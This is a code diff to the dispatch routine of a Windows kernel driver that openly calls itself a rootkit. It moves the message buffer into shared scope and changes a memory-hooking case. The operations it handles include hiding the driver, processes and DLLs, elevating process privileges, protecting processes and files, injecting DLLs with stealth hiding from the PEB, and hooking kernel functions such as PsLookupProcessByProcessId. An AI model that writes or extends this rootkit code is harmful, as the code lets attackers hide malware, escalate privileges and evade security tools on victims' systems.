@@ -187,6 +187,7 @@ namespace Rootkit {
         bool stealth = request->stealth;
         ADDRESS_RANGE addressToBlock = request->addressToBlock;
         int retval;
+        char buf[256];
         switch (control_code) {
         case codes::HideDriver:
             DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
@@ -200,7 +201,6 @@ namespace Rootkit {
             //status = PsLookupProcessByProcessId(request->process_id, &target_process);
             eval = ProcessUtils::ElevateProcess(HandleToUlong(pid));
             if (eval == 1) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been elevated successfully", HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -213,7 +213,6 @@ namespace Rootkit {
         case codes::HideProcess:
             eval = ProcessUtils::HideProcess(HandleToUlong(pid));
             if (eval == 1) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been hidden successfully", HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -225,7 +224,6 @@ namespace Rootkit {
             if (eval == 1) {
                 if (workItem) {
                     DbgPrint("[+] Work Item Called at protect process.\n");
-                    char buf[256];
                     status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully", HandleToUlong(pid));
                     if (NT_SUCCESS(status)) {
                         IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -236,7 +234,6 @@ namespace Rootkit {
                 }
             }
             else if (eval == 0) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is already critical.", HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -256,7 +253,6 @@ namespace Rootkit {
         case codes::HideDLL:
             eval = ProcessUtils::HideDLL(HandleToUlong(pid), DLLName);
             if (eval == 1) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL \"%ws\" has been successfully hidden from process %d.", DLLName, HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -270,7 +266,6 @@ namespace Rootkit {
             eval = ProcessUtils::UnProtectProcess(HandleToUlong(pid));
             if (eval == 1) {
                 if (workItem) {
-                    char buf[256];
                     status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been unprotected successfully", HandleToUlong(pid));
                     if (NT_SUCCESS(status)) {
                         IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -278,7 +273,6 @@ namespace Rootkit {
                 }
             }
             else if (eval == 0) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is not critical, nothing changed.", HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -288,7 +282,6 @@ namespace Rootkit {
 #ifdef DL
         case codes::ProtectProcessOP:
             if (Callbacks::AddProtectionProcess(HandleToUlong(pid))) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully (ACCESS_DENIED Protection)", (int)HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -300,7 +293,6 @@ namespace Rootkit {
             break;
         case codes::UnProtectProcessOP:
             if (Callbacks::RemoveProtectionProcess(HandleToUlong(pid))) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been unprotected successfully (ACCESS_DENIED Protection)", (int)HandleToUlong(pid));
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -313,7 +305,6 @@ namespace Rootkit {
 #endif
         case codes::ProtectFile:
             if (FileUtils::AddFile(Path)) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now protected from deletion.", Path);
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -325,7 +316,6 @@ namespace Rootkit {
             break;
         case codes::UnProtectFile:
             if (FileUtils::RemoveFile(Path)) {
-                char buf[256];
                 status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] File: %ws is now unprotected.", Path);
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
@@ -354,34 +344,40 @@ namespace Rootkit {
             break;
             */
         case codes::InjectDLL:
-            char buf[256];
             retval = ProcessUtils::InjectDLL(Path, HandleToUlong(pid), stealth);
             if (retval == STATUS_SUCCESS) {
-                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully.");
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully.\n");
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                 }
             }
             else if (retval == STATUS_SUCCESS_WITH_STEALTH) {
-                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully. -- STEALTH: DLL Has been hidden from PEB.");
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL Has been injected successfully. -- STEALTH: DLL Has been hidden from PEB.\n");
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                 }
             }
             else {
-                status = RtlStringCbPrintfA(buf, sizeof(buf), "[-] Couldn't inject DLL, check debug.");
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[-] Couldn't inject DLL, check debug.\n");
                 if (NT_SUCCESS(status)) {
                     IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
                 }
             }
             break;
         case codes::BlockAddress:
-            status = HookingUtils::HookMmIsAddressValid(addressToBlock);
+            status = HookingUtils::HookMemory(HandleToUlong(pid));
             if (status == STATUS_SUCCESS) {
-                DbgPrint("[HOOK-CALLER] MmIsAddressValid Hook has been applied / updated.\n");
+                DbgPrint("[HOOK-CALLER] Memory Hook has been applied / updated.\n");
             }
             if (status == STATUS_INVALID_ADDRESS) {
-                DbgPrint("[HOOK-CALLER-ERROR] MmIsAddressValid Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.");
+                DbgPrint("[HOOK-CALLER-ERROR] Memory Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.\n");
+            }
+            else {
+                DbgPrint("[HOOK-CALLER-ERROR] General Error in Memory Hook, STATUS: %d", status);
+            }
+            status = RtlStringCbPrintfA(buf, sizeof(buf), "[-] STATUS Returned: %d\n", status);
+            if (NT_SUCCESS(status)) {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
             }
             break;
         case codes::BlockPIDAccess:
@@ -390,7 +386,7 @@ namespace Rootkit {
                 DbgPrint("[HOOK-CALLER] PsLookupProcessByProcessId Hook has been applied / updated.\n");
             }
             if (status == STATUS_INVALID_ADDRESS) {
-                DbgPrint("[HOOK-CALLER-ERROR] PsLookupProcessByProcessId Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.");
+                DbgPrint("[HOOK-CALLER-ERROR] PsLookupProcessByProcessId Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.\n");
             }
             break;
         case codes::DeleteAllHooks:
@@ -399,7 +395,7 @@ namespace Rootkit {
                 DbgPrint("[HOOK-DELETER] All hooks have been successfully detached and destroyed.\n");
             }
             else {
-                DbgPrint("[HOOK-DELETER-ERROR] An error has occured when attempting to delete hooks. | STATUS: %d", status);
+                DbgPrint("[HOOK-DELETER-ERROR] An error has occured when attempting to delete hooks. | STATUS: %d\n", status);
             }
             break;
         default:
